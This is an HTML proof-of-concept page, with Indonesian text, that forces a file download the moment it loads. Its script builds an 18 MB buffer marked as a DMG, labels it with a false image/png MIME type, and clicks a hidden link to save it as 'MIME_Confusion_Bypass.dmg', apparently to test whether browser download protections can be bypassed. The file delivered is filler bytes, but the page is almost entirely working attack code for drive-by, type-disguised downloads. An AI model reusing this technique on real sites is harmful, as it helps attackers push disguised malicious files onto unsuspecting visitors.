<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Auto Download MIME Confusion</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
        .panel { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); max-width: 600px; width: 100%; }
        h2 { color: #d32f2f; margin-bottom: 10px; }
        p { margin-bottom: 20px; line-height: 1.6; color: #555; }
        #status { margin-top: 20px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; border: 1px solid #ffcdd2; }
    </style>
</head>

<body>
<div class="panel" id="main-panel">
    <h2>Auto Download MIME Confusion</h2>
    <p>Halaman ini akan otomatis mengunduh file .dmg 18MB (MIME: image/png) saat dimuat.</p>
    <div id="status" role="status">Mempersiapkan unduhan otomatis...</div>
</div>

<script>
    const statusDiv = document.getElementById("status");

    // Fungsi untuk membuat Data URI dari file biner (DMG 18MB)
    const createDmgDataUri = () => {
        // 1. Ukuran file: 18 MB
        const sizeInBytes = 18 * 1024 * 1024;
        
        // 2. Buat buffer Uint8Array
        const bytes = new Uint8Array(sizeInBytes);
        
        // 3. Sisipkan Header DMG ('koly')
        bytes[0] = 0x6B; // k
        bytes[1] = 0x6F; // o
        bytes[2] = 0x6C; // l
        bytes[3] = 0x79; // y

        // 4. Konversi ke Base64 secara bertahap
        let binary = "";
        const chunkSize = 8192; 
        
        for (let i = 0; i < bytes.length; i += chunkSize) {
            const chunk = bytes.subarray(i, i + chunkSize);
            binary += String.fromCharCode.apply(null, chunk);
        }
        
        const base64Data = btoa(binary);
        
        // 5. Buat Data URI dengan MIME Type palsu: image/png
        return `data:image/png;base64,${base64Data}`;
    };

    // Fungsi untuk memicu unduhan
    const autoDownload = () => {
        statusDiv.textContent = "Membuat Data URI (18MB) dengan MIME palsu...";

        try {
            // Buat Data URI
            const dataUri = createDmgDataUri();
            
            // Buat elemen anchor untuk memicu unduhan
            const a = document.createElement("a");
            a.href = dataUri;
            a.download = "MIME_Confusion_Bypass.dmg";
            a.style.display = "none";
            document.body.appendChild(a);
            
            // Picu klik otomatis
            a.click();
            
            setTimeout(() => {
                document.body.removeChild(a);
                statusDiv.textContent = "Unduhan otomatis dipicu! Cek folder Download.";
                statusDiv.style.color = "#4CAF50";
            }, 1000);

        } catch (e) {
            statusDiv.textContent = "Gagal: " + e.message;
            statusDiv.style.color = "#f00";
        }
    };

    // MEMICU OTOMATIS SAAT HALAMAN SELESAI DIMUAT
    window.addEventListener('load', () => {
        // Jeda sedikit agar UI sempat dirender
        setTimeout(autoDownload, 500);
    });
</script>
</body>
</html>
